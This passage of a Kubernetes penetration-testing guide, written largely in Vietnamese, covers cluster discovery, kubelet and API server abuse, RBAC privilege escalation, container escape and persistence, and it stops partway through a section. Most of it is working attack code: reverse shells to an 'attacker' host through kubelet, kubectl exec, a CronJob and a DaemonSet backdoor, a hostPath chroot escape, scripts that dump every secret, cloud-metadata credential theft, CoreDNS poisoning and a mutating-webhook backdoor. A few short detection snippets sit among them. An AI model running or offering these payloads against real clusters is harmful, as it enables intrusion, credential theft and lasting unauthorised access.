kubectl get secret <sa-token-secret> -n <ns> -o jsonpath='{.data.token}' | base64 -d
```

### 23. Pod & Container Discovery

**With kubectl:**
```bash
# All pods
kubectl get pods --all-namespaces

# Wide output (show IP, node)
kubectl get pods -o wide --all-namespaces

# Detailed info
kubectl describe pod <pod> -n <ns>

# Pod YAML (full spec)
kubectl get pod <pod> -n <ns> -o yaml

# Pod with labels
kubectl get pods --show-labels --all-namespaces

# Check container images
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\t"}{.spec.containers[*].image}{"\n"}{end}'

# Check security context
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | {name: .metadata.name, ns: .metadata.namespace}'

# Check for hostPath volumes
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.volumes[].hostPath != null) | {name: .metadata.name, ns: .metadata.namespace, hostPath: .spec.volumes[].hostPath}'
```

**From inside cluster (no kubectl):**
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
API="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

# List pods
curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/pods

# List all namespaces (to know where to look)
curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces

# Get specific pod details
curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/default/pods/<pod-name>
```

### 24. Peirates — K8s Attack Framework

**Peirates** là tool chuyên cho penetration testing Kubernetes.

**Install & use:**
```bash
# Clone and build
git clone https://github.com/inguardians/peirates
cd peirates
go build

# Interactive menu
./peirates

# Or command-line
./peirates --help

# Get service account info
./peirates -get-service-account-info

# Try to list secrets
./peirates -steal-secrets

# Try to launch a pod with hostPath
./peirates -launch-pod host-path

# Try to get kubelet access
./peirates -kubelet-scan <cidr>
```

**Peirates features:**
- Service account token extraction
- RBAC enumeration (via SelfSubjectAccessReview)
- Pod creation for privilege escalation
- Secret theft
- kubelet API interaction
- etcd access (if certs available)
- AWS IAM credential theft (from pod metadata)
- Service account token abusing (token replacement in pods)

**Workflow với Peirates:**
```
1. Run ./peirates
2. Select "Get Service Account Token"
3. Select "Get Pod Information"
4. Select "Check RBAC permissions" 
5. If permitted: Create a privileged pod, or steal secrets, or access kubelet
6. Escalate to node access
```

### 25. k9s & Kube-hunter

**k9s** — Terminal UI cho Kubernetes:
```bash
# Install
curl -sS https://webinstall.dev/k9s | bash

# Run
k9s

# Keybindings:
# :pods — view pods
# :secrets — view secrets (nếu có permission)
# :deploy — view deployments
# :rbac — view RBAC
# ctrl-d — delete
# ctrl-k — kill
# s — shell into pod
# l — logs

# Scan all clusters
k9s --all-namespaces
```

**kube-hunter** — Automated penetration testing:
```bash
# Install
pip install kube-hunter

# Scan specific host
kube-hunter --host <api-server>

# Scan CIDR
kube-hunter --cidr 10.0.0.0/8

# Quick scan from inside cluster
kube-hunter --pod

# Output JSON
kube-hunter --host <host> --report json

# Output to file
kube-hunter --host <host> --report yaml -o kube-hunter-report.yaml
```

**kube-hunter checks:**
1. API server anonymous access
2. kubelet anonymous access
3. etcd no auth
4. Open dashboard
5. Privileged containers
6. RBAC misconfiguration
7. Exposed service accounts
8. Cloud provider metadata access

---

## E. K8S ATTACK VECTORS

### 26. Unauthenticated kubelet API → RCE

Đây là **attack vector phổ biến và nguy hiểm nhất**.

**Scenario:**
- kubelet port 10250 mở với `--anonymous-auth=true`
- Hoặc kubelet port 10255 (read-only) mở → ít nhất info leak
- Hoặc có thể lấy được valid token từ compromised pod

**From read-only (10255) to RCE:**
```bash
# Step 1: Discover kubelet
kubeletctl scan --cidr 10.0.0.0/8

# Step 2: Get pod info
curl -s http://node:10255/pods | jq '.items[] | {name: .metadata.name, ns: .metadata.namespace, uid: .metadata.uid}'

# Step 3: Get pod UIDs - these give us container IDs
PODS_JSON=$(curl -s http://node:10255/pods)
echo "$PODS_JSON" | jq -r '.items[] | .metadata.uid'

# Step 4: Use the pod info to access authenticated 10250
# If 10255 is open, check if 10250 is also open with weak auth
curl -k https://node:10250/pods 2>&1 | head -5
# Nếu 403: need token. If unauthorized: need client cert
```

**If 10250 accepts anonymous (no auth):**
```bash
# List pods
curl -k https://node:10250/pods | jq .items[].metadata.name

# Get specific pod container
curl -sk https://node:10250/runningpods/ | jq '.items[].status.containerStatuses[].containerID'

# Exec into container (need SPDY/websocket upgrade)
# Easy way: use kubeletctl
kubeletctl -i node exec "id" -p nginx-pod -c nginx

# Or use the exec API
kubectl exec -it nginx-pod -- bash
# (If from another node/VM with valid kubeconfig)
```

**Direct RCE via kubelet API:**
```bash
# Run command
kubeletctl -i node exec "curl http://attacker/$(hostname)" -p <pod> -c <container>

# Reverse shell
kubeletctl -i node exec "bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'" -p <pod> -c <container>
```

### 27. API Server Anonymous Auth

**Check:**
```bash
# Direct anonymous request
curl -k https://<api-server>:6443/api/v1/pods

# If response is 403 "Forbidden" — auth enabled (good)
# If response is JSON (PodList) or 200 — anonymous access granted

# Try listing secrets
curl -k https://<api-server>:6443/api/v1/secrets

# Try creating a pod
curl -k -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"test"},"spec":{"containers":[{"name":"test","image":"nginx"}]}}' \
  https://<api-server>:6443/api/v1/namespaces/default/pods

# Check what user anonymous maps to
curl -k https://<api-server>:6443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews
```

**If anonymous + RBAC combined with cluster-admin binding:**
→ Full cluster compromise. Attacker can do anything.

### 28. etcd Without Auth

**Check from inside cluster:**
```bash
# Find etcd pod/node
kubectl get pods -n kube-system | grep etcd
kubectl describe pod -n kube-system etcd-<node>

# Check if etcd is accessible
ETCD_ENDPOINT="https://<etcd-ip>:2379"

# Try no-auth
curl -k $ETCD_ENDPOINT/version
etcdctl --endpoints=$ETCD_ENDPOINT endpoint health 2>&1

# If accessible, dump all:
ETCDCTL_API=3 etcdctl --endpoints=$ETCD_ENDPOINT get /registry/secrets --prefix
```

**From outside (cloud environments):**
```bash
# If etcd is exposed via LoadBalancer
nslookup etcd.internal.cluster.local
nmap -p2379 <etcd-ip>

# eks — etcd is managed, not directly accessible
# gke — etcd is managed
# aks — etcd is managed
# Self-managed clusters: etcd may be accessible
```

### 29. RBAC Misconfiguration Patterns

**Common misconfigurations:**

1. **User/SA bound to `cluster-admin`:**
   ```yaml
   kind: ClusterRoleBinding
   metadata:
     name: evil-sa-binding
   subjects:
   - kind: ServiceAccount
     name: dev-sa
     namespace: default
   roleRef:
     kind: ClusterRole
     name: cluster-admin  # 🚨
   ```

2. **Wildcard permissions:**
   ```yaml
   rules:
   - apiGroups: ["*"]      # ALL api groups
     resources: ["*"]      # ALL resources
     verbs: ["*"]          # ALL verbs
   ```

3. **`system:anonymous` has permissions:**
   ```yaml
   subjects:
   - kind: User
     name: system:anonymous  # 🚨
   ```

4. **Pod creation with cluster-admin SA:**
   - Khi pod chạy với SA có cluster-admin, và attacker có `create pod` permission
   - Attacker tạo pod với SA = cluster-admin → pod có full cluster access

5. **`rules` với resources = `secrets` hoặc `*`:**
   - `get` + `secrets` = đọc ALL secrets
   - `list` + `secrets` = list ALL secrets

6. **`rules` với `escalate`, `impersonate`, `bind`:**
   ```yaml
   rules:
   - resources: ["clusterroles"]
     verbs: ["escalate"]   # 🚨 Can escalate privileges
   - resources: ["users", "groups"]
     verbs: ["impersonate"] # 🚨 Can impersonate admin
   - resources: ["rolebindings", "clusterrolebindings"]
     verbs: ["bind"]        # 🚨 Can bind roles
   ```

7. **`subjects` với namespace rỗng trong ClusterRoleBinding:**
   ```yaml
   subjects:
   - kind: ServiceAccount
     name: my-sa
     namespace: ""           # 🚨 Cho phép trong mọi namespace!
     apiGroup: rbac.authorization.k8s.io
   ```

**Automated RBAC audit:**
```bash
# Rakkess — view access matrix
kubectl access-matrix

# kubectl-who-can
kubectl who-can create pods

# Checkov — scan K8s manifests
checkov -d . --framework kubernetes

# kubeaudit
kubeaudit all -n default
```

### 30. Service Account Token Leakage

**How tokens leak:**

1. **Pod logs:**
   ```bash
   kubectl logs <pod> | grep -i 'token\|eyJ'  # JWT starts with eyJ
   ```

2. **Environment variable dump:**
   ```bash
   kubectl exec <pod> -- env | grep TOKEN
   kubectl exec <pod> -- env | grep KUBERNETES
   ```

3. **Error messages / stack traces:**
   ```bash
   kubectl logs <pod> | grep -i 'Authorization\|Bearer\|token'
   ```

4. **Kubeconfig files:**
   ```bash
   # Nếu pod có init container copy kubeconfig
   kubectl exec <pod> -- cat /app/config
   ```

5. **Application code/binary:**
   ```bash
   kubectl cp <pod>:/app/binary /tmp/binary
   strings /tmp/binary | grep -i 'Bearer\|eyJ'
   ```

6. **Volume mounts:**
   ```bash
   # If SA token mounted to non-standard path
   kubectl exec <pod> -- find / -name "token" 2>/dev/null
   ```

### 31. Pod Impersonation

**Tạo pod với privileged service account:**

```bash
# Scenario: You have 'create pod' permission in namespace
# The 'default' SA has no permissions
# But there's an SA 'admin-sa' in kube-system with cluster-admin

# Step 1: Find privileged SA
kubectl get sa --all-namespaces
kubectl describe sa admin-sa -n kube-system

# Step 2: If SA has secrets (token), extract it
SA_SECRET=$(kubectl get sa admin-sa -n kube-system -o jsonpath='{.secrets[0].name}')
kubectl get secret $SA_SECRET -n kube-system -o jsonpath='{.data.token}' | base64 -d

# Step 3: Create pod with that SA
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: kube-system     # Cần namespace của SA
spec:
  serviceAccountName: admin-sa  # Privileged SA!
  containers:
  - name: attacker
    image: alpine
    command: ["sleep", "3600"]
EOF

# Step 4: From the pod, you have admin-sa permissions
kubectl exec -it attacker-pod -n kube-system -- sh
# Inside: kubectl get secrets --all-namespaces
# Or: curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/secrets
```

### 32. ConfigMap/Secret Enumeration

**ConfigMap có thể chứa credentials, connection strings, config files.**

```bash
# List all ConfigMaps
kubectl get configmaps --all-namespaces

# Get specific ConfigMap
kubectl get configmap <name> -n <ns> -o yaml

# Dump all ConfigMaps data (no-jq version)
kubectl get configmaps --all-namespaces -o json | python3 -c "
import sys, json
data = json.load(sys.stdin)
for item in data['items']:
    ns = item['metadata']['namespace']
    name = item['metadata']['name']
    print(f'\n=== {ns}/{name} ===')
    for k, v in item.get('data', {}).items():
        print(f'{k}: {v[:200]}')
    for k, v in item.get('binaryData', {}).items():
        print(f'{k}: [binary, len={len(v)}]')
"

# Secrets (if permitted)
kubectl get secrets --all-namespaces

# Decode all secrets
kubectl get secrets --all-namespaces -o json | python3 -c "
import sys, json, base64
data = json.load(sys.stdin)
for item in data['items']:
    ns = item['metadata']['namespace']
    name = item['metadata']['name']
    print(f'\n=== {ns}/{name} ===')
    for k, v in item.get('data', {}).items():
        try:
            decoded = base64.b64decode(v).decode('utf-8', errors='ignore')
            print(f'{k}: {decoded[:500]}')
        except:
            print(f'{k}: [binary, len={len(v)}]')
"
```

**Automated secret scanning across cluster:**
```bash
#!/bin/bash
# dump-all-secrets.sh
echo "=== ALL SECRETS ==="
kubectl get secrets --all-namespaces -o json | jq -r '
.items[] | 
{name: .metadata.name, ns: .metadata.namespace, type: .type} + 
(if .type == "kubernetes.io/service-account-token" then 
  {sa: .metadata.annotations["kubernetes.io/service-account.name"]} 
 else 
  {data: (.data | to_entries | map({key: .key, value: (.value | @base64d)}) | from_entries)} 
end)
'
```

### 33. Seccomp/AppArmor Disabled

**When seccomp or AppArmor disabled in pod spec:**

```yaml
# Pod without seccomp
spec:
  securityContext:
    seccompProfile:
      type: Unconfined  # 🚨 No seccomp!
  containers:
  - name: app
    securityContext:
      allowPrivilegeEscalation: true
```

**Checking from inside pod:**
```bash
cat /proc/1/status | grep Seccomp
# 0 = seccomp disabled
# 2 = filter mode (default)

cat /proc/1/attr/current
# If contains "unconfined" → AppArmor disabled
# Normal: "docker-default (enforce)"
```

**With seccomp disabled, attacker can:**
```bash
# Mount host filesystem
mount /dev/sda1 /mnt

# Create new namespaces
unshare --mount --propagation=slave --fork /bin/bash

# Use bpf to read kernel memory
bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf("%s\n", str(args->filename)); }'

# Load kernel module (if SYS_MODULE cap)
insmod /tmp/rootkit.ko
```

### 34. HostPath Volume → Host Filesystem Access

HostPath volume = mount host path vào container. Đây là **đường tắt đến host compromise**.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-pod
spec:
  containers:
  - name: attacker
    image: alpine
    command: ["sleep", "3600"]
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /                    # 🚨 Full host filesystem
      type: Directory
```

**If you can create pods with hostPath:**

```bash
# Create pod with host root
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: host-breaker
spec:
  containers:
  - name: breaker
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "chroot /host sh"]
    volumeMounts:
    - mountPath: /host
      name: hostroot
    securityContext:
      privileged: true
  volumes:
  - name: hostroot
    hostPath:
      path: /
      type: Directory
  restartPolicy: Never
EOF

# Now you have shell on host filesystem
kubectl exec -it host-breaker -- sh
# The shell is chroot'd into host root
# From here:
chroot /host bash
whoami  # Should be root
cat /etc/shadow
cat /var/lib/kubelet/config.yaml
```

**Other useful hostPath targets:**
```yaml
- hostPath:
    path: /var/run/docker.sock     # Docker escape
- hostPath:
    path: /dev                     # Device access
- hostPath:
    path: /proc                    # Process info
- hostPath:
    path: /etc/kubernetes           # K8s configs
- hostPath:
    path: /var/lib/kubelet          # Kubelet data
- hostPath:
    path: /var/log                  # Logs
- hostPath:
    path: /home                     # User data
- hostPath:
    path: /root/.ssh               # SSH keys
- hostPath:
    path: /etc/ssl                 # TLS certs
```

### 35. Sidecar Injection → Traffic Interception

**Nếu có permission `create pod` hoặc `patch pod`:**

```bash
# Giả sử có pod "target" với 1 container
# Inject sidecar container vào pod

# Patch pod to add sidecar (cần permission)
kubectl patch pod target -p '{
  "spec": {
    "containers": [{
      "name": "malicious-sidecar",
      "image": "alpine",
      "command": ["/bin/sh"],
      "args": ["-c", "tcpdump -i eth0 -w /tmp/capture.pcap & sleep 3600"],
      "securityContext": {
        "capabilities": {"add": ["NET_RAW", "NET_ADMIN"]}
      }
    }]
  }
}'

# Hoặc tạo pod mới với sidecar và redirect traffic
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: mitm-pod
spec:
  containers:
  - name: proxy
    image: alpine
    command: ["/bin/sh"]
    args:
    - -c
    - |
      apk add nginx
      cat > /etc/nginx/nginx.conf << 'CONF'
      events {}
      http {
        server {
          listen 80;
          location / {
            proxy_pass http://target-service:80;
            proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
          }
        }
      }
      CONF
      nginx -g 'daemon off;'
  hostNetwork: true  # Use host network
EOF
```

### 36. DNS Poisoning via CoreDNS

CoreDNS là DNS server mặc định trong Kubernetes. Nếu compromise CoreDNS:

```bash
# Check CoreDNS config
kubectl get configmap coredns -n kube-system -o yaml

# CoreDNS config map:
# .:53 {
#     errors
#     health
#     kubernetes cluster.local in-addr.arpa ip6.arpa {
#         pods insecure
#         fallthrough in-addr.arpa ip6.arpa
#     }
#     forward . /etc/resolv.conf
# }
```

**CoreDNS poisoning (nếu có permission):**
```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: coredns
  namespace: kube-system
data:
  Corefile: |
    .:53 {
        errors
        health
        # 🚨 Rewrite ANY query to attacker
        rewrite name regex (.*) attacker-service.default.svc.cluster.local
        kubernetes cluster.local in-addr.arpa ip6.arpa {
            pods insecure
            fallthrough in-addr.arpa ip6.arpa
        }
        forward . /etc/resolv.conf
    }
```

**Kiểm tra ghi nhận cache poisoning:**
```bash
# Check current DNS entries from pod
kubectl exec -it <pod> -- nslookup kubernetes.default.svc
kubectl exec -it <pod> -- nslookup google.com

# Nếu tất cả resolve về cùng IP → CoreDNS bị poison
```

---

## F. K8S PRIVILEGE ESCALATION

### 37. Pod → Node → Cluster

Con đường leo quyền điển hình trong Kubernetes:

```
Pod (compromised) 
   ↓ 
Node access (via kubelet, hostPath, privileged pod)
   ↓ 
Node compromise (root on node, kubelet certs)
   ↓ 
Cluster compromise (kubelet credentials → API server)
```

#### Stage 1: From Pod to Node

**Cách leo từ pod ra node:**

1. **Privileged pod + hostPath:**
   ```bash
   # Create pod with host root
   kubectl apply -f privileged-hostpath-pod.yaml
   kubectl exec -it <pod> -- chroot /host bash
   # Now you're root on the node!
   ```

2. **Docker socket in pod:**
   ```bash
   # If /var/run/docker.sock is mounted
   docker run -v /:/host -it alpine chroot /host bash
   ```

3. **kubelet API from pod:**
   ```bash
   # If kubelet API is accessible from pod network
   curl -k https://node:10250/pods
   # If returns pods - use exec to escape
   ```

4. **Cgroup escape:**
   ```bash
   # If pod has SYS_ADMIN capability
   mkdir /tmp/cgrp; mount -t cgroup -o memory cgroup /tmp/cgrp
   mkdir /tmp/cgrp/x
   echo "/escape.sh" > /tmp/cgrp/x/release_agent
   echo $$ > /tmp/cgrp/x/cgroup.procs
   ```

5. **Node service misconfiguration:**
   ```bash
   # NFS mounted to pod
   mount | grep nfs
   # If NFS allows root squashing, access NFS files
   ```

#### Stage 2: From Node to Cluster

Once on a node as root:

```bash
# Method 1: Use kubelet credentials
ls -la /var/lib/kubelet/pki/
# kubelet-client.crt and kubelet-client.key

# Get kubelet cert
KUBELET_CERT=/var/lib/kubelet/pki/kubelet-client-current.pem
KUBELET_KEY=/var/lib/kubelet/pki/kubelet-client-current-key.pem

# Use cert to access kubelet API
curl -k --cert $KUBELET_CERT --key $KUBELET_KEY https://127.0.0.1:10250/pods

# The kubelet cert can also be used to access API server
kubectl --client-certificate=$KUBELET_CERT --client-key=$KUBELET_KEY get pods

# Method 2: Use bootstrap token
ls -la /etc/kubernetes/
cat /etc/kubernetes/bootstrap-kubelet.conf

# Method 3: Use admin.conf (if accessible)
cat /etc/kubernetes/admin.conf
```

**Node → Cluster via cloud metadata:**
```bash
# On cloud nodes, metadata service may provide service account tokens
# GCP
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# AWS
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure
curl -H "Metadata: true" http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### 38. Service Account Token Abuse

**When you have a service account token with limited permissions:**

```bash
# Check what permissions the token has
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

# Try various operations
for op in "get pods" "list pods" "get secrets" "list secrets" "create pods" "list clusterroles"; do
  VERB=$(echo $op | awk '{print $1}')
  RESOURCE=$(echo $op | awk '{print $2}')
  RESP=$(curl -sk -X POST \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectAccessReview\",\"spec\":{\"resourceAttributes\":{\"namespace\":\"default\",\"verb\":\"$VERB\",\"resource\":\"$RESOURCE\"}}}" \
    $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews)
  ALLOWED=$(echo $RESP | python3 -c "import sys,json; print(json.load(sys.stdin).get('status',{}).get('allowed',False))" 2>/dev/null)
  if [ "$ALLOWED" = "True" ]; then
    echo "[+] Can $op"
  fi
done
```

### 39. Role/ClusterRole Binding Manipulation

**If you have `create` verb for `rolebindings` or `clusterrolebindings`:**

```bash
# Create RoleBinding binding cluster-admin to your SA
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: malicious-admin-binding
subjects:
- kind: ServiceAccount
  name: $(cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin)['kubernetes.io/serviceaccount/service-account.name'])" 2>/dev/null || echo "default")
  namespace: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF
```

**If you have `bind` verb on `clusterroles`:**
```bash
# Check if you can bind to cluster-admin
kubectl auth can-i bind cluster-admin

# If yes:
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: escalate-bind
subjects:
- kind: ServiceAccount
  name: attacker-sa
  namespace: default
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF
```

**If you have `escalate` verb (can override RBAC on ClusterRole):**
```yaml
# This is EXTREMELY powerful
# Example SA that can escalate:
apiVersion: v1
kind: ServiceAccount
metadata:
  name: dangerous-sa
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: can-escalate
rules:
- apiGroups: ["rbac.authorization.k8s.io"]
  resources: ["clusterroles"]
  verbs: ["escalate"]  # 🚨 Can escalate ANY cluster role
```

### 40. TokenReview/SubjectAccessReview Manipulation

**If you have `create` permission on `tokenreviews` or `selfsubjectaccessreviews`:**
- Thường không có direct exploitation path từ đây
- Nhưng có thể dùng để enumerate permissions systematically

```bash
# Use SAR to check if specific user/SA has permissions
curl -sk -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "apiVersion": "authorization.k8s.io/v1",
    "kind": "SubjectAccessReview",
    "spec": {
      "user": "system:serviceaccount:kube-system:admin-sa",
      "resourceAttributes": {
        "namespace": "default",
        "verb": "list",
        "resource": "secrets"
      }
    }
  }' \
  $APISERVER/apis/authorization.k8s.io/v1/subjectaccessreviews
```

### 41. Impersonate Privilege

**`impersonate` verb là một trong những cách leo quyền mạnh nhất.**

```yaml
# Role allowing impersonation
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: impersonator
rules:
- apiGroups: [""]
  resources: ["users", "groups", "serviceaccounts"]
  verbs: ["impersonate"]
---
# Bind to attacker SA
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: impersonator-binding
subjects:
- kind: ServiceAccount
  name: attacker-sa
  namespace: default
roleRef:
  kind: ClusterRole
  name: impersonator
  apiGroup: rbac.authorization.k8s.io
```

**Exploitation:**
```bash
# Impersonate as admin user
kubectl --as=system:admin get secrets --all-namespaces

# Impersonate as cluster-admin group
kubectl --as=anything --as-group=system:masters get secrets

# API call with impersonation headers
curl -sk \
  -H "Authorization: Bearer $TOKEN" \
  -H "Impersonate-User: system:admin" \
  -H "Impersonate-Group: system:masters" \
  $APISERVER/api/v1/secrets
```

**Detecting impersonation:**
- Audit logs ghi lại `impersonatedUser` và `impersonatedGroups`
- Check: `kubectl get events -A | grep impersonate`

### 42. Pod Exec to Running Containers

**Direct exec via API:**

```bash
# API call for pod exec (WebSocket/SPDY upgrade needed)
# With kubectl:
kubectl exec -it <pod> -n <ns> -- bash

# Direct API:
# Need to understand SPDY protocol — kubectl handles this internally
# But if you can exec, you can:
# 1. Read env for secrets
# 2. Read mounted secrets
# 3. Access network from pod
# 4. Use pod's service account token

# Exec reverse shell
kubectl exec <pod> -- bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
```

### 43. Secrets Dump from Pods

**Once inside a pod (via exec or RCE):**

```bash
# 1. Read mounted secrets
find / -name "token" -o -name "*.secret" -o -name "*.key" -o -name "*.pem" 2>/dev/null

# 2. Environment variables
env | grep -i secret
env | grep -i password
env | grep -i token
env | grep -i key
env | grep -i credential

# 3. Config files
find / -name "*.config" -o -name "*.conf" -o -name "config.*" -o -name "*.json" -o -name "*.yaml" -o -name "*.yml" -o -name "*.toml" 2>/dev/null | xargs grep -l "password\|secret\|token\|api_key\|access_key" 2>/dev/null

# 4. Application logs
find / -name "*.log" -type f 2>/dev/null | xargs grep -l "password\|secret\|token" 2>/dev/null

# 5. Process memory
cat /proc/*/environ 2>/dev/null
```

### 44. Node Access via kubelet

**Once you have node access (root), you control all pods on that node:**

```bash
# View all containers on node
crictl ps
docker ps

# Exec into any container on this node
crictl exec -it <container-id> sh
docker exec -it <container-id> bash

# Read any pod's secrets
ls /var/lib/kubelet/pods/<pod-uid>/volumes/kubernetes.io~secret/

# Modify kubelet config
vim /var/lib/kubelet/config.yaml
# Could change: authentication, authorization, or add static pods

# Create static pods (always restarted by kubelet)
cat > /etc/kubernetes/manifests/static-escape.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: static-escape
  namespace: kube-system
spec:
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
    volumeMounts:
    - mountPath: /host
      name: host
    securityContext:
      privileged: true
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
EOF
```

---

## G. K8S PERSISTENCE

### 45. CronJob với Malicious Pod Creation

CronJob tự động tạo pods theo lịch, rất hiệu quả cho persistence:

```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: persistence-cron
  namespace: default
spec:
  schedule: "*/5 * * * *"  # Every 5 minutes
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: attacker-sa
          containers:
          - name: persist
            image: alpine
            command:
            - /bin/sh
            - -c
            - |
              # Re-establish access
              kubectl run backdoor --image=alpine --restart=Never -- sleep 3600 || true
              kubectl exec backdoor -- bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1' || true
          restartPolicy: OnFailure
```

**Detection:** Check for CronJobs
```bash
kubectl get cronjobs --all-namespaces
kubectl describe cronjob <name>
kubectl get jobs --all-namespaces
```

### 46. Backdoor DaemonSet

DaemonSet chạy trên MỌI node — hoàn hảo cho persistence:

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-backdoor
  namespace: kube-system  # Hide in system namespace
spec:
  selector:
    matchLabels:
      app: node-backdoor
  template:
    metadata:
      labels:
        app: node-backdoor
    spec:
      hostPID: true
      hostNetwork: true
      containers:
      - name: backdoor
        image: alpine
        securityContext:
          privileged: true
        command:
        - /bin/sh
        - -c
        - |
          # Open reverse shell on each node
          while true; do
            bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1' 2>/dev/null
            sleep 60
          done
        volumeMounts:
        - mountPath: /host
          name: host-root
      volumes:
      - name: host-root
        hostPath:
          path: /
          type: Directory
      tolerations:
      - operator: "Exists"  # Run on ALL nodes (including control plane)
```

**Detection:**
```bash
kubectl get daemonsets --all-namespaces
kubectl describe daemonset <name>
# Check for unusual tolerations
kubectl get daemonset <name> -o yaml | grep -A5 tolerations
```

### 47. Webhook Backdoors

MutatingAdmissionWebhook có thể MODIFY mọi API request — backdoor cực kỳ mạnh:

```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingAdmissionWebhook
metadata:
  name: backdoor-webhook
spec:
  clientConfig:
    service:
      name: backdoor-webhook-service
      namespace: default
      path: /mutate
    caBundle: <base64-ca-cert>
  rules:
  - operations: ["CREATE", "UPDATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]  # Intercept ALL pod creation
  admissionReviewVersions: ["v1"]
  sideEffects: None
  failurePolicy: Ignore  # Don't block if webhook is down
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: backdoor-webhook
  namespace: default
spec:
  replicas: 1
  selector:
    matchLabels:
      app: backdoor-webhook
  template:
    metadata:
      labels:
        app: backdoor-webhook
    spec:
      containers:
      - name: webhook
        image: alpine
        command:
        - /bin/sh
        - -c
        - |
          # Webhook server that adds sidecar to every pod
          apk add openssl
          # Simple HTTP server
          while true; do
            echo -e "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n$(cat response.json)" | nc -l -p 8443
          done
```

**Response JSON mẫu cho MutatingWebhook:**
```json
{
  "apiVersion": "admission.k8s.io/v1",
  "kind": "AdmissionReview",
  "response": {
    "uid": "<request-uid>",
    "allowed": true,
    "patchType": "JSONPatch",
    "patch": "W3sib3AiOiAiYWRkIiwgInBhdGgiOiAiL3NwZWMvY29udGFpbmVycy8tIiwgInZhbHVlIjogeyJpbWFnZSI6ICJhbHBpbmUiLCAibmFtZSI6ICJiYWNrZG9vciIsICJjb21tYW5kIjogWyJzbGVlcCIsICI4NjQwMCJdLCAic2VjdXJpdHlDb250ZXh0IjogeyJwcml2aWxlZ2VkIjogdHJ1ZX19fV0="
  }
}
```

Base64 decode patch: `[{"op": "add", "path": "/spec/containers/-", "value": {"image": "alpine", "name": "backdoor", "command": ["sleep", "86400"], "securityContext": {"privileged": true}}}]`

**Detection:**
```bash
# List all webhooks
kubectl get mutatingwebhookconfigurations
kubectl get validatingwebhookconfigurations

# Check webhook config in detail
kubectl get mutatingwebhookconfiguration <name> -o yaml

# Look for unknown webhook services
kubectl get svc --all-namespaces | grep webhook
```

### 48. Backdoor Container Images

**Tạo backdoor image trong private registry:**

```bash
# On attacker machine with registry access
docker pull alpine:latest
docker run -it alpine sh
# Inside: install backdoor tools, reverse shell script
# Exit

# Tag and push
docker tag <container-id> <registry>/backdoor:latest
docker push <registry>/backdoor:latest

# Deploy to cluster
kubectl create deployment backdoor --image=<registry>/backdoor:latest
```

**Or modify existing deployment's image:**
```bash
kubectl set image deployment/legacy-app app=<registry>/backdoor:latest
```

**Detection:**
```bash
# Check image sources
